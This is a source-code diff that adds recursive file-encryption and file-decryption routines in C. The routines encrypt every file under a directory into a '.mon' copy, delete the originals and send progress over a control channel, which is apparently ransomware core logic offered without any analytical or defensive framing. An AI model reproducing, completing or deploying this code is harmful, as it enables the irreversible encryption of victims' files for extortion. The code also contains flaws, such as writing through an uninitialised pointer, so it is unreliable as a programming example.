@@ -31,9 +31,80 @@
 #include "tools.h"
 #include "channel.h"
 
-void begin_encrypt(char *path)
+char *ext = ".mon";
+
+int begin_encrypt(char *path)
 {
     struct dirent *dir;
+    DIR *dr = opendir(path);
 
-    if 
+    if (dr == NULL)
+        return 0;
+
+    char *newName, *toVisit;
+    FILE *old, *newone;
+
+    while ((dir = readdir(dr)) != NULL) {
+        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ext) == NULL) {
+            toVisit = linkStr(path, dir->d_name, 1);
+            if (begin_encrypt(toVisit) == 0) {
+                newName = linkStr(toVisit, ext, 0);
+                old = fopen(toVisit, "rb");
+                newone = fopen(newName, "wb");
+
+                encrypt(old, newone, key, iv);
+                deleteFile(toVisit);
+
+                fclose(old);
+                fclose(newone);
+
+                free(newName);
+            } else {
+                char *process;
+                sprintf(process, "Encrypting %s\n", dir->d_name);
+                send_channel(channel, process);
+            }
+            free(toVisit);
+        }
+    }
+    closedir(dr);
+    return 1;
+}
+
+int begin_decrypt(char *path)
+{
+    struct dirent *dir;
+    DIR *dr = opendir(path);
+
+    if (dr == NULL)
+        return 0;
+
+    char *newName, *toVisit;
+    FILE *old, *newone;
+
+    while ((dir = readdir(dr)) != NULL) {
+        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
+            toVisit = linkStr(path, dir->d_name, 1);
+            if (begin_decrypt(toVisit) == 0) {
+                newName = removeLastChars(toVisit, strlen(ext));
+                old = fopen(toVisit, "rb");
+                newone = fopen(newName, "wb");
+
+                decrypt(old, newone, key, iv);
+                deleteFile(toVisit);
+
+                fclose(old);
+                fclose(newone);
+
+                free(newName);
+            } else {
+                char *process;
+                sprintf(process, "Decrypting %s\n", dir->d_name);
+                send_channel(channel, process);
+            }
+            free(toVisit);
+        }
+    }
+    closedir(dr);
+    return 1;
 }
